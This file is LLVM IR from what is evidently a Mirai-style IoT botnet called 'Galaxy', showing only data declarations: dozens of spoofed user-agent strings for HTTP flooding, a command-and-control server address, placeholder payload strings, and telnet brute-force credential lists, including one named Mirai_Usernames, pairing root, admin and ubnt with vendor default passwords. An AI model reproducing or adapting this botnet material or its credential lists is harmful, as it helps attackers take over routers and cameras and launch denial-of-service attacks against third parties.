; ModuleID = 'host/ir_O1/Galaxy.g.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }

@useragents = local_unnamed_addr global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.58, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.3 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.7 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.8 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.9 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.10 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.11 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.12 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.13 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.14 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.16 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.17 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.18 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.19 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.20 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.21 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.23 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.24 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.25 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.26 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.27 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.28 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.30 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.31 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.32 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.35 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.36 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.37 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.39 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.40 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.41 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.42 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.43 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.44 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.45 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.46 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.47 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.48 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.51 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.52 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.53 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.54 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.58 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0)], align 8
@.str.59 = private unnamed_addr constant [14 x i8] c"127.0.0.1:760\00", align 1
@Busybox_Payload = local_unnamed_addr global i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.60, i64 0, i64 0), align 8
@.str.60 = private unnamed_addr constant [18 x i8] c"Payload w Busybox\00", align 1
@Payload = local_unnamed_addr global i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.61, i64 0, i64 0), align 8
@.str.61 = private unnamed_addr constant [25 x i8] c"\C2\B4Payload Witout Busybox\00", align 1
@Telnet_Usernames = local_unnamed_addr global [35 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 16
@.str.62 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.63 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.66 = private unnamed_addr constant [15 x i8] c"default\00admin\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.68 = private unnamed_addr constant [10 x i8] c"S2fGqNFs\00\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@Telnet_Passwords = local_unnamed_addr global [35 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0)], align 16
@.str.70 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.72 = private unnamed_addr constant [12 x i8] c"adminadmin\00\00", align 1
@.str.73 = private unnamed_addr constant [15 x i8] c"OxhlwSG8\00true\00\00", align 1
@.str.74 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"asante\00\00", align 1
@.str.76 = private unnamed_addr constant [15 x i8] c"LSiuY7pOmZG2s\00\00", align 1
@.str.77 = private unnamed_addr constant [11 x i8] c"Uq-4GIt3M\00\00", align 1
@.str.78 = private unnamed_addr constant [8 x i8] c"GM8182\00\00", align 1
@.str.79 = private unnamed_addr constant [8 x i8] c"cms500\00\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.81 = private unnamed_addr constant [9 x i8] c"3ep5w2u\00\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"Serv4EMC0\00\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"ROOT500\00\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"tlJwpbo6\00\00", align 1
@.str.85 = private unnamed_addr constant [10 x i8] c"ahetzip8\00\00", align 1
@.str.86 = private unnamed_addr constant [12 x i8] c"inflection\00\00", align 1
@.str.87 = private unnamed_addr constant [10 x i8] c"kont2004\00\00", align 1
@.str.88 = private unnamed_addr constant [16 x i8] c"t0talc0ntr0l4!\00\00", align 1
@.str.89 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.90 = private unnamed_addr constant [11 x i8] c"awind5885\00\00", align 1
@Mirai_Usernames = local_unnamed_addr global [34 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 16
